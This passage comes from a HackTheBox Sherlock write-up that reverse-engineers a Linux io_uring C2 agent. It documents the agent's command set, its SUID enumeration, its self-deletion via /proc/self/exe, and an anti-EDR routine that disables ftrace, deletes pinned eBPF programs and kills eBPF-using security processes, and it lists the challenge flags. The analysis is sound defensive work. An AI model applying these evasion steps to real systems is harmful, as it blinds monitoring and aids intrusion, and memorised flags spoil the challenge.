[0x00002e84]> s sym.cmd_privesc
[0x000032d8]> VV
```
{: .wrap }

<img src="/images/HackTheBox/Sherlocks/PhantomRing/cmd_privesc_disasm.webp" alt="cmd_privesc function disassembly showing directory path">

The function loads the directory path `/usr/bin` and opens it with `opendir()`. It then iterates through each entry using `readdir()`, constructs the full path as `/usr/bin/<filename>`, and calls `statx()` (via io_uring) to check the file mode for the SUID bit. Any matches are reported back to the C2 operator as "Potential SUID binaries."

String table confirmation:

```asm
31  0x0000527f 0x0000527f  8   9   .rodata ascii /usr/bin
32  0x00005288 0x00005288 24  25   .rodata ascii Failed to open /usr/bin
33  0x000052a1 0x000052a1 25  26   .rodata ascii Potential SUID binaries:
34  0x000052bb 0x000052bb 11  12   .rodata ascii /usr/bin/%s
```
{: file="String Dumping" }

The format string `/usr/bin/%s` at index 34 is used with `snprintf()` to construct the full path for each binary found in the directory listing.

> **Flag 8:** `/usr/bin`
{: .prompt-danger }

---

## Task 9 — String Searched in /proc/[pid]/maps

The `cmd_killbpf` function is the malware's anti-EDR weapon. It targets security tools that use eBPF (Extended Berkeley Packet Filter) for monitoring — tools like Falco, Tetragon, and Tracee. To find these processes, it scans `/proc/[pid]/maps` looking for a specific string that indicates eBPF map usage.

```console
[0x00003e84]> s sym.cmd_killbpf
[0x000037a2]> pdf
```
{: .wrap }


Scrolling through the disassembly, around address `0x00003c77` the function formats the string `/proc/%s/maps` with a PID, reads that file, and then immediately calls `strstr()` to search for a specific substring. The critical instructions are:

```asm
0x00003ccc      lea rdx, str.anon_inode:bpf_map    ; 0x5426 ; "anon_inode:bpf-map"
0x00003cd3      mov rsi, rdx                         ; const char *s2 (needle)
0x00003cd9      call sym.imp.strstr                  ; char *strstr(const char *s1, const char *s2)
```

The `strstr()` call at `0x00003cd9` searches the contents of `/proc/<pid>/maps` for the string `anon_inode:bpf-map`. The `rdx` register holds the needle (the search string) and `rsi` is set from `rdx` before the call.


String table confirmation at index 48:

```asm
47  0x00005418 0x00005418 13  14   .rodata ascii /proc/%s/maps
48  0x00005426 0x00005426 18  19   .rodata ascii anon_inode:bpf-map
49  0x00005439 0x00005439 29  30   .rodata ascii [+] Killed PID using BPF: %d
```
{: file="String Dumping" }

> **How it works:** eBPF programs in the Linux kernel use anonymous inodes (via `anon_inode_getfd()`) to represent their memory maps. When a security tool loads an eBPF program for syscall monitoring or network filtering, the kernel creates these `anon_inode:bpf-map` entries in the process's `/proc/<pid>/maps` file. By scanning all processes' map files for this string, the malware can identify which PIDs belong to EDR/security tools and then `kill()` them.
{: .prompt-tip }

> **Flag 9:** `anon_inode:bpf-map`
{: .prompt-danger }

---

## Task 10 — First Tracing File the Agent Disables

The `cmd_killbpf` function has a dual purpose: it doesn't just kill eBPF-using processes — it also **disables kernel tracing** before doing so. This is a layered defense evasion technique: first blind the tracing infrastructure, then eliminate the eBPF-based monitors.

```console
[0x000037a2]> s sym.cmd_killbpf
[0x000037a2]> pdf | head -n 40
```
{: .wrap }

At the very beginning of the function, after variable setup, the author loads an array of three file paths that control Linux kernel ftrace (Function Tracer) — the kernel's built-in tracing framework:

```asm
0x000037fb      lea rax, str._sys_kernel_debug_tracing_tracing_on
                                            ; 0x5330 ; "/sys/kernel/debug/tracing/tracing_on"
0x00003802      mov qword [rbp - 0x6130], rax   ; array[0]

0x00003809      lea rax, str._sys_kernel_debug_tracing_set_event
                                            ; 0x5358 ; "/sys/kernel/debug/tracing/set_event"
0x00003810      mov qword [rbp - 0x6128], rax   ; array[1]

0x00003817      lea rax, str._sys_kernel_debug_tracing_current_tracer
                                            ; 0x5380 ; "/sys/kernel/debug/tracing/current_tracer"
0x0000381e      mov qword [rbp - 0x6120], rax   ; array[2]
```


The function then iterates over this array and writes `0` to each file, effectively disabling all kernel tracing. The **first** file in this array (and the first one the agent attempts to disable) is:

| Order | File Path | Effect When Disabled |
| :--- | :--- | :--- |
| **1st** | **`/sys/kernel/debug/tracing/tracing_on`** | **Global ftrace on/off switch — writing `0` immediately stops all tracing** |
| 2nd | `/sys/kernel/debug/tracing/set_event` | Disables all trace events (emptying the event list) |
| 3rd | `/sys/kernel/debug/tracing/current_tracer` | Sets the tracer to "nop" (no-operation / disabled) |

String table confirmation:

```asm
39  0x00005330 0x00005330 36  37   .rodata ascii /sys/kernel/debug/tracing/tracing_on
40  0x00005358 0x00005358 35  36   .rodata ascii /sys/kernel/debug/tracing/set_event
41  0x00005380 0x00005380 40  41   .rodata ascii /sys/kernel/debug/tracing/current_tracer
42  0x000053ab 0x000053ab 25  26   .rodata ascii [*] Tracing disabled: %s
```

The string at index 42 confirms the function prints `[*] Tracing disabled: <path>` after successfully zeroing each file.

> **Flag 10:** `/sys/kernel/debug/tracing/tracing_on`
{: .prompt-danger }

---

## Task 11 — procfs Path for Self-Locator

The `cmd_selfdestruct` function is the malware's cleanup routine — it deletes the binary from disk to remove forensic evidence. To do this, it first needs to know **where on disk** the running binary lives. Linux provides a standard mechanism for this via the procfs filesystem.

```console
[0x00003546]> s sym.cmd_selfdestruct
[0x00003546]> pdf
```
{: .wrap }

The function begins by sending the message `"Agent will self-destruct\n"` back to the C2 operator. Then it prepares to resolve its own path on disk:

```asm
; Send self-destruct notification
0x00003571      lea rax, str.Agent_will_self_destruct_n  ; 0x52cb
0x00003578      mov qword [s], rax
0x0000357f      mov rax, qword [s]
0x00003586      mov rdi, rax
0x00003589      call sym.imp.strlen          ; Get message length
0x0000358e      mov rcx, rax                   ; len
0x00003591      mov rdx, qword [s]             ; buf
0x00003598      mov esi, dword [var_2bch]      ; socket_fd
0x0000359e      mov rax, qword [var_2b8h]
0x000035a5      mov rdi, rax
0x000035a8      call sym.send_all              ; Send to C2

; Resolve own binary path via readlink on /proc/self/exe
0x000035ad      lea rax, [buf]                 ; Destination buffer
0x000035b4      mov edx, 0x1ff                ; Buffer size = 511 bytes
0x000035b9      mov rsi, rax                   ; buf
0x000035bc      lea rax, str._proc_self_exe    ; 0x52e5 ; "/proc/self/exe"
0x000035c3      mov rdi, rax                   ; path = /proc/self/exe
; ... (calls readlink on /proc/self/exe)
```

At address `0x000035bc`, the `lea` instruction loads the address of the string literal `"/proc/self/exe"`. This is the standard Linux mechanism for a process to discover its own executable path. The `/proc/self/exe` is a symbolic link maintained by the kernel that always points to the absolute path of the running executable. When the malware calls `readlink("/proc/self/exe", buf, 511)`, the kernel resolves this symlink and writes something like `/var/tmp/agent` into the buffer. The malware then passes this resolved path to `unlinkat()` (via io_uring) to delete itself from disk.

String table confirmation at index 36:

```asm
35  0x000052cb 0x000052cb 25  26   .rodata ascii Agent will self-destruct
36  0x000052e5 0x000052e5 14  15   .rodata ascii /proc/self/exe
37  0x000052f4 0x000052f4 18  19   .rodata ascii Unlink failed: %s
38  0x00005308 0x00005308 32  33   .rodata ascii Agent disconnecting and exiting
```
{: file="String Dumping" }

> **Why /proc/self/exe:** This is the most reliable way for a running process to find its own binary path on Linux. Alternatives like `argv[0]` are unreliable because they can be set to arbitrary values by the calling process. The procfs symlink is maintained by the kernel and always reflects the true path, even if the binary was deleted (in which case it shows `(deleted)` appended to the path).
{: .prompt-tip }

> **Flag 11:** `/proc/self/exe`
{: .prompt-danger }

---

## Task 12 — Self-Destruct Command String

The final task asks us to identify the exact command string that the C2 operator must send to trigger the agent's self-deletion routine. There are two approaches to find this: analyzing the command dispatcher (`process_cmd`) or dumping all strings and identifying the command keywords.

### Approach 1: String Dumping

The fastest approach is to dump all strings in the binary with `iz` and look for command-like keywords:

```console
[0x00003546]> iz
```
{: .wrap }

Scrolling through the string table, we find the command strings at the end of the `.rodata` section:

```asm
52  0x0000549d 0x0000549d  4   5   .rodata ascii get
53  0x000054a2 0x000054a2  5   6   .rodata ascii recv
54  0x000054a8 0x000054a8  5   6   .rodata ascii users
55  0x000054b1 0x000054b1  7   8   .rodata ascii netstat
56  0x000054bf 0x000054bf  4   5   .rodata ascii kick
57  0x000054c4 0x000054c4  7   8   .rodata ascii privesc
58  0x000054cc 0x000054cc  9  10   .rodata ascii sdestruct
59  0x000054d6 0x000054d6  7   8   .rodata ascii killbpf
60  0x000054de 0x000054de  4   5   .rodata ascii exit
```
{: file="String Dumping" }

At index 58 we see `sdestruct` — a truncated form of "self-destruct." This is the command string the C2 operator sends to trigger the `cmd_selfdestruct` function.

### Approach 2: Cross-Referencing with `axt`

To be absolutely certain, we cross-reference the string address to see exactly which function uses it:

```console
[0x00003546]> axt 0x000054cc
```
{: .wrap }

`sym.process_cmd 0x40a8 [STRN:r--] lea rdx, str.sdestruct`


The `axt` command (cross-reference to) shows that the string at `0x000054cc` (`"sdestruct"`) is referenced by `sym.process_cmd` at address `0x40a8`. This is the command dispatcher function that compares the incoming C2 command against all known command strings and routes to the appropriate handler function.

### Complete C2 Command Mapping

For completeness, here is the full command table derived from the string dump, mapped to their handler functions:

| Index | String Address | Command | Handler Function |
| :--- | :--- | :--- | :--- |
| 52 | `0x0000549d` | `get` | `sym.cmd_get` |
| 53 | `0x000054a2` | `recv` | `sym.cmd_recv` |
| 54 | `0x000054a8` | `users` | `sym.cmd_users` |
| 55 | `0x000054b1` | `netstat` | `sym.cmd_ss` |
| 56 | `0x000054bf` | `kick` | `sym.cmd_kick` |
| 57 | `0x000054c4` | `privesc` | `sym.cmd_privesc` |
| 58 | `0x000054cc` | **`sdestruct`** | **`sym.cmd_selfdestruct`** |
| 59 | `0x000054d6` | `killbpf` | `sym.cmd_killbpf` |
| 60 | `0x000054de` | `exit` | `sym.cmd_exit` |

Note: `cmd_me` and `cmd_ps` are also handler functions but their command strings (`me`, `ps`) can be found by cross-referencing those functions within `process_cmd`.

> **Flag 12:** `sdestruct`
{: .prompt-danger }

---

## Command Receive Loop — The C2 Heartbeat

Returning to the `main` function, after a successful connection the malware enters its primary operational loop. This loop receives commands from the C2 server, passes them to the dispatcher, and repeats indefinitely until the connection is lost:

```asm
; --- Command Receive Loop (0x43f6) ---
0x000043f6      lea rax, [rbp - 0x100f0]       ; &ring
0x000043fd      mov rdi, rax
0x00004400      call sym.imp.io_uring_get_sqe  ; Get SQE for recv
0x00004405      mov qword [rbp - 0x10110], rax

0x0000440c      lea rdx, [rbp - 0x10010]      ; recv buffer (0xFFF0 bytes)
0x00004413      mov esi, dword [rbp - 0x10120] ; socket_fd
0x00004419      mov rax, qword [rbp - 0x10110] ; sqe
0x00004420      mov r8d, 0                    ; msg_flags = 0
0x00004426      mov ecx, 0xffff               ; recv length = 65535
0x0000442b      mov rdi, rax                   ; sqe
0x0000442e      call sym.io_uring_prep_recv   ; Queue recv operation

0x00004433      lea rax, [rbp - 0x100f0]
0x0000443a      mov rdi, rax
0x0000443d      call sym.imp.io_uring_submit  ; Submit to kernel

0x00004442      lea rdx, [rbp - 0x10118]      ; &cqe
0x00004449      lea rax, [rbp - 0x100f0]
0x00004450      mov rsi, rdx
0x00004453      mov rdi, rax
0x00004456      call sym.io_uring_wait_cqe   ; Wait for command data
```

On successful receive, the buffer is null-terminated and passed to `process_cmd()`:

```asm
0x000044a7      mov rax, qword [rbp - 0x10118]  ; cqe
0x000044ae      mov eax, dword [rax + 8]        ; cqe->res (bytes received)
0x000044b1      cdqe
0x000044b3      mov qword [rbp - 0x10108], rax  ; bytes_received

0x000044ba      ; ... io_uring_cqe_seen ...

0x000044d3      lea rdx, [rbp - 0x10010]       ; command buffer
0x000044da      mov rax, qword [rbp - 0x10108] ; bytes_received
0x000044e1      add rax, rdx                   ; buf + bytes_received
0x000044e4      mov byte [rax], 0              ; null-terminate the string

0x000044e7      lea rdx, [rbp - 0x10010]       ; command string
0x000044ee      mov ecx, dword [rbp - 0x10120] ; socket_fd
0x000044f4      lea rax, [rbp - 0x100f0]
0x000044fb      mov esi, ecx
0x000044fd      mov rdi, rax
0x00004500      call sym.process_cmd            ; Dispatch command

0x00004505      jmp 0x43f6                       ; Loop back to recv
```

The `jmp 0x43f6` at the end creates an infinite loop — the agent keeps receiving and processing commands until the connection drops.

---

## Cleanup & Connection Close

When the connection is lost (recv returns 0 or negative), the malware properly cleans up before exiting:

```asm
; --- Cleanup on disconnect (0x450a) ---
0x0000450a      lea rax, [rbp - 0x100f0]
0x00004511      mov rdi, rax
0x00004514      call sym.imp.io_uring_get_sqe  ; Get SQE

0x00004520      mov edx, dword [rbp - 0x10120] ; socket_fd
0x00004526      mov rax, qword [rbp - 0x10110]
0x0000452d      mov esi, edx
0x0000452f      mov rdi, rax
0x00004532      call sym.io_uring_prep_close   ; Queue close(socket_fd)

0x00004537      lea rax, [rbp - 0x100f0]
0x0000453e      mov rdi, rax
0x00004541      call sym.imp.io_uring_submit  ; Submit close

; ... wait for completion ...

0x00004578      lea rax, [rbp - 0x100f0]
0x0000457f      mov rdi, rax
0x00004582      call sym.imp.io_uring_queue_exit  ; Destroy io_uring instance

0x00004587      lea rax, str.___Connection_closed  ; "[+] Connection closed"
0x0000458e      mov rdi, rax
0x00004591      call sym.imp.puts

; --- Stack canary check ---
0x00004596      xor eax, eax
0x0000459b      mov rdx, qword [canary]
0x0000459f      sub rdx, qword fs:[0x28]
0x000045a8      je 0x45af                       ; Good canary → clean exit
0x000045aa      call sym.imp.__stack_chk_fail ; Bad canary → abort

0x000045af      leave
0x000045b0      ret
```

Even during cleanup, the malware uses io_uring — the socket close operation goes through `io_uring_prep_close` and `io_uring_submit` rather than a direct `close()` syscall. The io_uring instance is properly destroyed with `io_uring_queue_exit()` before the process exits.

---

## The `cmd_killbpf` Anti-EDR Workflow

Since `cmd_killbpf` is the most complex and interesting function (1762 bytes — the largest command handler), let's break down its complete workflow. This function implements a three-stage defense evasion kill chain:

### Stage 1: Disable Kernel Tracing (ftrace)

The function first loads the three ftrace control file paths into an array (as we saw in Task 10), then iterates over them. For each file, it opens the file via io_uring, writes `0` to disable tracing, and prints a confirmation message. This ensures that any kernel-level function tracer (which could detect the malware's io_uring operations) is blinded before the more aggressive actions follow.

```asm
; Write "0" to each ftrace control file
; Opens file via io_uring_prep_openat
; Writes 1 byte ("0") via io_uring_prep_write
; Closes file via io_uring_prep_close
; Prints: [*] Tracing disabled: <path>
```

### Stage 2: Delete eBPF Programs from /sys/fs/bpf

After disabling tracing, the function opens `/sys/fs/bpf` (the mount point for eBPF program filesystem objects) and iterates through all pinned eBPF programs:

```asm
43  0x000053c5 0x000053c5 11  12   .rodata ascii /sys/fs/bpf
44  0x000053d1 0x000053d1 14  15   .rodata ascii /sys/fs/bpf/%s
45  0x000053e0 0x000053e0 25  26   .rodata ascii [+] Deleted BPF file: %s
```
{: file="String Dumping" }

Each pinned eBPF program file is deleted using `io_uring_prep_unlinkat()`, which removes the BPF program from the filesystem and effectively unloads it from the kernel. This is devastating because many EDR solutions pin their eBPF programs here for persistence across reboots.

### Stage 3: Hunt and Kill EDR Processes

Finally, the function scans `/proc/` to enumerate all running PIDs, opens `/proc/<pid>/maps` for each one, and searches for the string `anon_inode:bpf-map` using `strstr()`. Any process found with this string in its memory maps is immediately killed using the `kill()` syscall with `SIGKILL` (signal 9):

```asm
47  0x00005418 0x00005418 13  14   .rodata ascii /proc/%s/maps
48  0x00005426 0x00005426 18  19   .rodata ascii anon_inode:bpf-map
49  0x00005439 0x00005439 29  30   .rodata ascii [+] Killed PID using BPF: %d
50  0x00005458 0x00005458 30  31   .rodata ascii [-] Failed to kill PID %d: %s
51  0x00005478 0x00005478 36  37   .rodata ascii [*] No processes with BPF map found
```
{: file="String Dumping" }

---

## Tools & Techniques Used

| Tool | Command | Purpose |
| :--- | :--- | :--- |
| `file` | `file agent` | Identify binary type, architecture, stripping status |
| `ldd` | `ldd agent` | List shared library dependencies |
| `sha256sum` | `sha256sum agent` | Compute cryptographic hash for threat intel lookup |
| `ltrace` | `ltrace ./agent` | Intercept library calls — reveals API-level behavior |
| `strace` | `strace -f ./agent` | Intercept syscalls — reveals kernel-level behavior |
| **radare2** | `r2 -A ./agent` | Full static analysis: disassembly, function listing, string extraction, cross-referencing |
| r2 `afl` | `afl` / `afl ~ cmd_` | List all functions / filter for specific patterns |
| r2 `s` | `s main` / `s sym.cmd_users` | Seek to a function or address |
| r2 `pdf` | `pdf` | Print disassembly of current function |
| r2 `VV` | `VV` | Visual graph mode — interactive flowchart |
| r2 `iz` | `iz` | Dump all strings in the binary |
| r2 `axt` | `axt 0xaddr` | Find all cross-references TO an address |
| `rg` | `rg 'io_uring_setup'` | Filter strace output for specific patterns |

---

<style>
img {
  transition: all 0.3s ease;
}

img:hover {
  transform: scale(1.05);
  filter: brightness(90%);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0);
}

img:center {
  display: block;
  margin-left: auto;
  margin-right: auto;
}

.wrap pre {
  white-space: pre-wrap;
}

.gif-container {
    text-align: center;
    margin: 30px 0;
}

.gif-responsive {
    width: 100%;
    max-width: 800px;
    height: 450px;
    border-radius: 12px;
    object-fit: cover;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.gif-responsive:hover {
    transform: scale(1.02);
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
}

/* Additional video styles */
.video-container {
  text-align: center;
  margin: 30px auto;        /* centers inside post */
  max-width: 800px;         /* keeps container from being huge */
}

.video-responsive {
  width: 100%;              /* fill container */
  aspect-ratio: 16 / 9;    /* keeps correct proportions on desktop */
  border-radius: 12px;
  object-fit: cover;
  box-shadow: 0 10px 25px rgba(0.1, 0.1, 0, 0.1);
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.video-responsive:hover {
  transform: scale(1.02);
  box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
}

/* Mobile Responsive Styles */
@media screen and (max-width: 768px) {
  .gif-responsive {
    width: 100% !important;
    max-width: 100% !important;
    height: auto !important;
  }

  .video-responsive {
    width: 100% !important;
    max-width: 100% !important;
    aspect-ratio: auto;  /* let phone use natural aspect ratio */
    height: auto !important;
  }
  
  .box-button {
    max-width: 100% !important;
    width: 100% !important;
    padding: 10px 14px !important;
    justify-content: center !important;
    gap: 6px !important;
    position: relative;
  }
  /* Hide desktop text on mobile */
  .box-button span {
    display: none !important;
  }

  /* Show mobile text from data attribute */
  .box-button::after {
    content: attr(data-mobile-text) !important;
    font-size: 10px !important;
    text-align: center !important;
    white-space: nowrap !important;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
    font-weight: 1000 !important;
  }

      /* DEFAULT: Use #a1a1a1 for most buttons */
    .box-button::after {
      color: #a1a1a1 !important;
    }

    /* Specific color overrides for each button style */
    
    /* CYBER BLUE NEON - Blue text */
    .box-button[style*="color: #00ccff"]::after,
    .box-button[style*="color:#00ccff"]::after {
      color: #00ccff !important;
    }

    /* HACKER GREEN TERMINAL - Green text */
    .box-button[style*="color: #00ff88"]::after,
    .box-button[style*="color:#00ff88"]::after {
      color: #00ff88 !important;
    }

    /* PURPLE NEON LIGHT - Purple text */
    .box-button[style*="color: #cc00ff"]::after,
    .box-button[style*="color:#cc00ff"]::after {
      color: #cc00ff !important;
    }

    /* RED ALERT GLOW - Red text (#ff4444) */
    .box-button[style*="color: #ff4444"]::after,
    .box-button[style*="color:#ff4444"]::after,
    .box-button[style*="color: #ff5555"]::after,
    .box-button[style*="color:#ff5555"]::after {
      color: #ff4444 !important;
    }

    /* ORANGE SUNLIGHT - Orange text */
    .box-button[style*="color: #ffaa00"]::after,
    .box-button[style*="color:#ffaa00"]::after {
      color: #ffaa00 !important;
    }

    /* MINIMAL LIGHT SHINE - Dark text for light background */
    .box-button[style*="background: #ffffff"]::after,
    .box-button[style*="background:#ffffff"]::after,
    .box-button[style*="color: #333333"]::after,
    .box-button[style*="color:#333333"]::after {
      color: #333333 !important;
    }

    /* TEAL CYBER GLOW - Teal text */
    .box-button[style*="color: #5eead4"]::after,
    .box-button[style*="color:#5eead4"]::after {
      color: #5eead4 !important;
    }

    /* PINK NEON LIGHT - Pink text */
    .box-button[style*="color: #f9a8d4"]::after,
    .box-button[style*="color:#f9a8d4"]::after {
      color: #f9a8d4 !important;
    }

    /* FOREST GREEN LIGHT - Lime text */
    .box-button[style*="color: #bef264"]::after,
    .box-button[style*="color:#bef264"]::after {
      color: #bef264 !important;
    }

    /* DARK RED WINE GLOW - Light red text */
    .box-button[style*="color: #fecaca"]::after,
    .box-button[style*="color:#fecaca"]::after {
      color: #fecaca !important;
    }

    /* LIGHT BLUE SKY SHINE - Blue text */
    .box-button[style*="color: #1e40af"]::after,
    .box-button[style*="color:#1e40af"]::after {
      color: #1e40af !important;
    }

    /* DARK ORANGE GLOW - Orange text */
    .box-button[style*="color: #fdba74"]::after,
    .box-button[style*="color:#fdba74"]::after {
      color: #fdba74 !important;
    }

    /* CYBER YELLOW - Yellow text */
    .box-button[style*="color: #fef08a"]::after,
    .box-button[style*="color:#fef08a"]::after {
      color: #fef08a !important;
    }

    /* DEEP SPACE - Purple text */
    .box-button[style*="color: #9370db"]::after,
    .box-button[style*="color:#9370db"]::after {
      color: #9370db !important;
    }

    /* ELECTRIC PINK - Pink text */
    .box-button[style*="color: #e879f9"]::after,
    .box-button[style*="color:#e879f9"]::after {
      color: #e879f9 !important;
    }

    /* LAVA RED - Light red text */
    .box-button[style*="color: #fca5a5"]::after,
    .box-button[style*="color:#fca5a5"]::after {
      color: #fca5a5 !important;
    }

    /* AQUA MARINE - Teal text */
    .box-button[style*="color: #99f6e4"]::after,
    .box-button[style*="color:#99f6e4"]::after {
      color: #99f6e4 !important;
    }

    /* ROYAL PURPLE - Light purple text */
    .box-button[style*="color: #d8b4fe"]::after,
    .box-button[style*="color:#d8b4fe"]::after {
      color: #d8b4fe !important;
    }

    /* EMERALD GREEN - Green text */
    .box-button[style*="color: #6ee7b7"]::after,
    .box-button[style*="color:#6ee7b7"]::after {
      color: #6ee7b7 !important;
    }

    /* MIDNIGHT BLUE - Light blue text */
    .box-button[style*="color: #93c5fd"]::after,
    .box-button[style*="color:#93c5fd"]::after {
      color: #93c5fd !important;
    }

    /* Light backgrounds with colored text - use original colors */
    .box-button[style*="background: linear-gradient(135deg, #fef3c7"]::after,
    .box-button[style*="background: linear-gradient(135deg, #fde68a"]::after,
    .box-button[style*="background: linear-gradient(135deg, #f8fafc"]::after,
    .box-button[style*="background: linear-gradient(135deg, #dbeafe"]::after,
    .box-button[style*="background: linear-gradient(135deg, #bfdbfe"]::after {
      color: #333333 !important; /* Dark text for better contrast on light backgrounds */
    }

  .box-button img {
    width: 28px !important;
    height: 28px !important;
    margin-right: 0 !important;
  }
}
/* Desktop Styles */
@media screen and (min-width: 769px) {
  .box-button::after {
    display: none !important;
  }
  
  .box-button span {
    display: inline !important;
  }
}
</style>
<script>
// Function to make only .redirect class links open in new tabs, but not work here actually i don'know why
document.querySelectorAll('a.redirect').forEach(link => {
    link.setAttribute('target', '_blank');
    link.setAttribute('rel', 'noopener noreferrer');
});
</script>
